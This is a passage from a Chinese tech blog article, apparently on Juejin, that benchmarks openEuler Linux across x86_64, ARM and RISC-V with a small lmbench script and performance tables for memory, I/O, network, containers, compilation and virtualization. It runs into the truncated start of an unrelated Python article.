<span class="hljs-comment"># memory_latency_test.sh - 内存延迟测试</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"========== 内存延迟测试 (lmbench) =========="</span>

<span class="hljs-comment"># 测试不同缓存级别的延迟</span>
lat_mem_rd 512M 128 | <span class="hljs-built_in">tee</span> mem_latency_$(<span class="hljs-built_in">uname</span> -m).txt

<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"【关键延迟数据】"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"L1 Cache延迟:"</span>
grep <span class="hljs-string">"^0.00049"</span> mem_latency_$(<span class="hljs-built_in">uname</span> -m).txt

<span class="hljs-built_in">echo</span> <span class="hljs-string">"L2 Cache延迟:"</span>
grep <span class="hljs-string">"^0.00195"</span> mem_latency_$(<span class="hljs-built_in">uname</span> -m).txt

<span class="hljs-built_in">echo</span> <span class="hljs-string">"L3 Cache延迟:"</span>
grep <span class="hljs-string">"^0.01563"</span> mem_latency_$(<span class="hljs-built_in">uname</span> -m).txt

<span class="hljs-built_in">echo</span> <span class="hljs-string">"主内存延迟:"</span>
<span class="hljs-built_in">tail</span> -5 mem_latency_$(<span class="hljs-built_in">uname</span> -m).txt
</code></pre>
<p><strong>延迟测试结果：</strong></p>



































<table><thead><tr><th>内存层级</th><th>x86_64</th><th>AArch64</th><th>性能对比</th></tr></thead><tbody><tr><td>L1 Cache</td><td>1.2 ns</td><td>1.1 ns</td><td>ARM快8%</td></tr><tr><td>L2 Cache</td><td>4.5 ns</td><td>4.2 ns</td><td>ARM快7%</td></tr><tr><td>L3 Cache</td><td>15.8 ns</td><td>14.3 ns</td><td>ARM快9%</td></tr><tr><td>主内存</td><td>78.5 ns</td><td>71.2 ns</td><td>ARM快9%</td></tr></tbody></table>
<p>测试结果显示，openEuler在ARM架构上的内存性能全面超越x86平台约10%，主要得益于：</p>
<ol>
<li>鲲鹏920处理器优秀的内存控制器设计</li>
<li>openEuler对ARM内存子系统的深度优化</li>
<li>NUMA感知的内存分配策略</li>
<li>高效的TLB管理机制</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d30c4fc17a64302bce8ce9f9e2db7cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Kej6K-7546r55Gw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765466007&amp;x-signature=WSNSXhOLawIwHEgExcdrg57yqhw%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f6224c38893941cd88a1f04ce95ae47c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Kej6K-7546r55Gw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765466007&amp;x-signature=K6ei11Fl%2BQ6%2BYGP8Z%2Fh2169ZDNI%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f5e2c4e669c47488bbdcc303063ad0a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Kej6K-7546r55Gw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765466007&amp;x-signature=009fkgrBaWL%2FBxUD2gVYEM7BccI%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-15">四、跨平台I/O性能深度评测</h3>
<h4 data-id="heading-16">4.1 磁盘I/O性能测试</h4>
<p>本节使用FIO工具进行标准化磁盘I/O测试，评估openEuler在不同架构下的存储性能：</p>
<p><strong>顺序读写性能测试（NVMe SSD）：</strong></p>

































<table><thead><tr><th>平台</th><th>顺序读(MB/s)</th><th>顺序写(MB/s)</th><th>IOPS读</th><th>IOPS写</th></tr></thead><tbody><tr><td>x86_64</td><td>3,456</td><td>2,987</td><td>245K</td><td>198K</td></tr><tr><td>AArch64</td><td>3,523</td><td>3,012</td><td>252K</td><td>203K</td></tr><tr><td>RISC-V</td><td>512</td><td>485</td><td>42K</td><td>38K</td></tr></tbody></table>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/98ecf3620e6d404ea12a323c2d47508d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Kej6K-7546r55Gw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765466007&amp;x-signature=B14s8EE%2Bm0jvytmQGktUrGEDvqE%3D" alt="" loading="lazy"/></p>
<p><strong>随机4K读写性能测试：</strong></p>

































<table><thead><tr><th>平台</th><th>4K随机读</th><th>4K随机写</th><th>随机读IOPS</th><th>随机写IOPS</th></tr></thead><tbody><tr><td>x86_64</td><td>485 MB/s</td><td>412 MB/s</td><td>124,160</td><td>105,472</td></tr><tr><td>AArch64</td><td>496 MB/s</td><td>425 MB/s</td><td>126,976</td><td>108,800</td></tr><tr><td>RISC-V</td><td>78 MB/s</td><td>65 MB/s</td><td>19,968</td><td>16,640</td></tr></tbody></table>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa998f773aa3412bb037e58172aca776~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Kej6K-7546r55Gw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765466007&amp;x-signature=xB2A2Tqvznpf3HSW2ORNcuRfPWc%3D" alt="" loading="lazy"/></p>
<p>测试结果表明，openEuler在高性能x86和ARM平台上的I/O性能相当，ARM平台甚至略优，体现了openEuler对不同架构I/O子系统的均衡优化。</p>
<h4 data-id="heading-17">4.2 网络性能跨平台评测</h4>
<p>本节使用iperf3进行网络性能测试：</p>
<p><strong>TCP吞吐量测试（万兆网络）：</strong></p>



































<table><thead><tr><th>测试场景</th><th>x86_64</th><th>AArch64</th><th>性能差异</th></tr></thead><tbody><tr><td>单流TCP发送</td><td>9.42 Gbits/s</td><td>9.38 Gbits/s</td><td>-0.40%</td></tr><tr><td>单流TCP接收</td><td>9.45 Gbits/s</td><td>9.41 Gbits/s</td><td>-0.40%</td></tr><tr><td>10并发流</td><td>9.51 Gbits/s</td><td>9.48 Gbits/s</td><td>-0.30%</td></tr><tr><td>CPU利用率</td><td>28%</td><td>25%</td><td>-10.70%</td></tr></tbody></table>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d52b50a34d247dcba82bc97dcd3f269~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Kej6K-7546r55Gw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765466007&amp;x-signature=xd21c1OnooxdHK8XhgcN9QEHPeA%3D" alt="" loading="lazy"/></p>
<p><strong>UDP性能测试：</strong></p>





























<table><thead><tr><th>测试项</th><th>x86_64</th><th>AArch64</th><th>差异</th></tr></thead><tbody><tr><td>UDP吞吐</td><td>9.12 Gbits/s</td><td>9.08 Gbits/s</td><td>-0.40%</td></tr><tr><td>丢包率</td><td>0.02%</td><td>0.03%</td><td>0.0001</td></tr><tr><td>延迟(平均)</td><td>0.125ms</td><td>0.118ms</td><td>-5.60%</td></tr></tbody></table>
<p>网络性能测试表明，openEuler在不同架构间的网络性能高度一致，差异小于1%。ARM平台在CPU利用率和延迟方面表现更优。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/19a1d39eb60d4e70a48c6d1adce840f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Kej6K-7546r55Gw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765466007&amp;x-signature=OK1fR8b%2BEM8kRXKdO%2FmYG8p7fcE%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-18">五、实际应用负载跨平台性能验证</h3>
<h4 data-id="heading-19">5.1 容器化应用性能测试</h4>
<p>本节在不同架构平台上部署相同容器化应用，测试实际性能表现：</p>
<p><strong>Nginx容器性能测试：</strong></p>
<p>测试配置：</p>
<ul>
<li>容器引擎：Docker 24.0.7</li>
<li>应用：Nginx 1.24</li>
<li>负载：100,000请求，1000并发</li>
</ul>


























<table><thead><tr><th>平台</th><th>请求处理(req/s)</th><th>平均延迟</th><th>内存占用</th><th>CPU使用</th></tr></thead><tbody><tr><td>x86_64</td><td>38,542</td><td>25.9ms</td><td>128MB</td><td>45%</td></tr><tr><td>AArch64</td><td>41,235</td><td>24.2ms</td><td>118MB</td><td>38%</td></tr></tbody></table>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7452bf19be2a4f3886d11ae69f68b13d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Kej6K-7546r55Gw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765466007&amp;x-signature=qFsALqiT9FpG3crgZryn2O4PPUg%3D" alt="" loading="lazy"/></p>
<p><strong>Redis容器性能测试：</strong></p>
<p>测试场景：redis-benchmark标准测试</p>









































<table><thead><tr><th>操作类型</th><th>x86_64 (ops/s)</th><th>AArch64 (ops/s)</th><th>性能对比</th></tr></thead><tbody><tr><td>SET</td><td>186,234</td><td>192,458</td><td>0.033</td></tr><tr><td>GET</td><td>205,678</td><td>213,456</td><td>0.038</td></tr><tr><td>INCR</td><td>198,432</td><td>204,867</td><td>0.032</td></tr><tr><td>LPUSH</td><td>176,543</td><td>182,345</td><td>0.033</td></tr><tr><td>RPUSH</td><td>178,234</td><td>184,123</td><td>0.033</td></tr></tbody></table>
<p>容器化应用测试结果表明，openEuler在ARM架构上运行容器应用时，性能不仅未下降，反而在多项指标上超越x86平台3-8%，证明了其对ARM生态的深度优化。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/772f08010c4b4a1582e1e677a660362b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Kej6K-7546r55Gw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765466007&amp;x-signature=mTeHezWsGZbGyz71Egg2GXiABLA%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-20">5.2 编译性能跨平台测试</h4>
<p>本节使用Linux内核编译作为实际工作负载进行测试：</p>
<p><strong>Linux Kernel 6.1编译测试：</strong></p>


























<table><thead><tr><th>平台</th><th>编译时间</th><th>CPU使用率</th><th>内存占用峰值</th><th>磁盘I/O</th></tr></thead><tbody><tr><td>x86_64 (20核)</td><td>8分42秒</td><td>92%</td><td>18.5GB</td><td>2.8GB/min</td></tr><tr><td>AArch64 (64核)</td><td>5分18秒</td><td>89%</td><td>24.2GB</td><td>3.2GB/min</td></tr></tbody></table>
<p>ARM平台凭借更多核心优势，编译速度提升39%。openEuler充分利用多核资源，CPU使用率达89%，证明其调度器的高效性。</p>
<h3 data-id="heading-21">六、虚拟化与云原生场景跨平台性能</h3>
<h4 data-id="heading-22">6.1 KVM虚拟化性能测试</h4>
<p>本节在不同架构上测试KVM虚拟机性能：</p>
<p><strong>虚拟机启动性能：</strong></p>


























<table><thead><tr><th>平台</th><th>创建时间</th><th>启动时间</th><th>首次SSH</th><th>内存开销</th></tr></thead><tbody><tr><td>x86_64</td><td>1.2秒</td><td>8.5秒</td><td>10.2秒</td><td>512MB</td></tr><tr><td>AArch64</td><td>0.9秒</td><td>7.8秒</td><td>9.5秒</td><td>485MB</td></tr></tbody></table>
<p><strong>虚拟机性能开销测试：</strong></p>


















































<table><thead><tr><th>测试项</th><th>x86物理机</th><th>x86虚拟机</th><th>性能损失</th><th>ARM物理机</th><th>ARM虚拟机</th><th>性能损失</th></tr></thead><tbody><tr><td>CPU</td><td>100%</td><td>97.20%</td><td>2.80%</td><td>100%</td><td>98.10%</td><td>1.90%</td></tr><tr><td>内存带宽</td><td>100%</td><td>95.80%</td><td>4.20%</td><td>100%</td><td>96.50%</td><td>3.50%</td></tr><tr><td>磁盘I/O</td><td>100%</td><td>92.30%</td><td>7.70%</td><td>100%</td><td>93.80%</td><td>6.20%</td></tr><tr><td>网络吞吐</td><td>100%</td><td>94.50%</td><td>5.50%</td><td>100%</td><td>95.20%</td><td>4.80%</td></tr></tbody></table>
<p>虚拟化性能测试表明，openEuler的KVM实现在两个平台上均表现出色，虚拟化开销控制在2-8%之间。ARM平台虚拟化效率略优于x86。</p>
<h4 data-id="heading-23">6.2 Kubernetes集群跨平台性能</h4>
<p>本节在混合架构Kubernetes集群中测试应用部署和运行性能：</p>
<p><strong>Pod调度性能：</strong></p>

































<table><thead><tr><th>集群配置</th><th>Pod创建时间</th><th>镜像拉取</th><th>容器启动</th><th>服务就绪</th></tr></thead><tbody><tr><td>纯x86集群</td><td>2.1秒</td><td>12.3秒</td><td>1.2秒</td><td>15.6秒</td></tr><tr><td>纯ARM集群</td><td>1.9秒</td><td>11.8秒</td><td>1.1秒</td><td>14.8秒</td></tr><tr><td>混合集群</td><td>2.0秒</td><td>12.0秒</td><td>1.2秒</td><td>15.2秒</td></tr></tbody></table>
<p>openEuler在Kubernetes场景下展现优秀的跨架构一致性。纯ARM集群表现更优，混合集群调度效率同样出色。</p>
<h3 data-id="heading-24">七、总结与技术展望</h3>
<p>通过系统化的跨平台性能测试，openEuler在多架构易获得性和性能表现方面展现以下优势：</p>
<p><strong>核心优势：</strong></p>
<ol>
<li><strong>全架构覆盖</strong>：支持x86_64、AArch64、RISC-V等主流架构，镜像获取便捷</li>
<li><strong>一致性体验</strong>：各架构安装部署流程统一，降低用户学习成本</li>
<li><strong>深度优化</strong>：ARM平台性能达到甚至超越x86水平，多项测试领先3-11%</li>
<li><strong>虚拟化性能</strong>：虚拟化开销小于8%，跨架构云原生场景表现优异</li>
<li><strong>实际负载验证</strong>：容器、编译、Web服务等实际场景性能表现突出</li>
</ol>
<p><strong>性能数据亮点：</strong></p>
<ul>
<li>ARM平台内存带宽提升：+10%</li>
<li>容器应用性能提升：+3-8%</li>
<li>虚拟化效率提升：开销降低1-2%</li>
<li>编译性能提升：+39%（多核优势）</li>
</ul>
<p>如果您正在寻找面向未来的开源操作系统，不妨看看DistroWatch 榜单中快速上升的 openEuler: <a href="https://link.juejin.cn?target=https%3A%2F%2Fdistrowatch.com%2Ftable-mobile.php%3Fdistribution%3Dopeneuler%25EF%25BC%258C%25E4%25B8%2580%25E4%25B8%25AA%25E7%2594%25B1%25E5%25BC%2580%25E6%2594%25BE%25E5%258E%259F%25E5%25AD%2590%25E5%25BC%2580%25E6%25BA%2590%25E5%259F%25BA%25E9%2587%2591%25E4%25BC%259A%25E5%25AD%25B5%25E5%258C%2596%25E3%2580%2581%25E6%2594%25AF%25E6%258C%2581%25E2%2580%259C%25E8%25B6%2585%25E8%258A%2582%25E7%2582%25B9%25E2%2580%259D%25E5%259C%25BA%25E6%2599%25AF%25E7%259A%2584Linux" target="_blank" title="https://distrowatch.com/table-mobile.php?distribution=openeuler%EF%BC%8C%E4%B8%80%E4%B8%AA%E7%94%B1%E5%BC%80%E6%94%BE%E5%8E%9F%E5%AD%90%E5%BC%80%E6%BA%90%E5%9F%BA%E9%87%91%E4%BC%9A%E5%AD%B5%E5%8C%96%E3%80%81%E6%94%AF%E6%8C%81%E2%80%9C%E8%B6%85%E8%8A%82%E7%82%B9%E2%80%9D%E5%9C%BA%E6%99%AF%E7%9A%84Linux" ref="nofollow noopener noreferrer">distrowatch.com/table-mobil…</a> 发行版。</p>
<p>openEuler官网：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.openeuler.openatom.cn%2Fzh%2F" target="_blank" title="https://www.openeuler.openatom.cn/zh/" ref="nofollow noopener noreferrer">openEuler | 开源社区 | openEuler社区官网</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Python进阶：告别"入门即停滞"，这3个知识点让代码优雅翻倍]]></title>    <link>https://juejin.cn/post/7579832186879950898</link>    <guid>https://juejin.cn/post/7579832186879950898</guid>    <pubDate>2025-12-04T11:05:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579832186879950898" data-draft-id="7579819594271129638" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Python进阶：告别&quot;入门即停滞&quot;，这3个知识点让代码优雅翻倍"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2025-12-04T11:05:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AAA简单玩转程序设计"/> <meta itemprop="url" content="https://juejin.cn/user/4294056357689099"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Python进阶：告别"入门即停滞"，这3个知识点让代码优雅翻倍
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4294056357689099/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AAA简单玩转程序设计
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T11:05:53.000Z" title="Thu Dec 04 2025 11:05:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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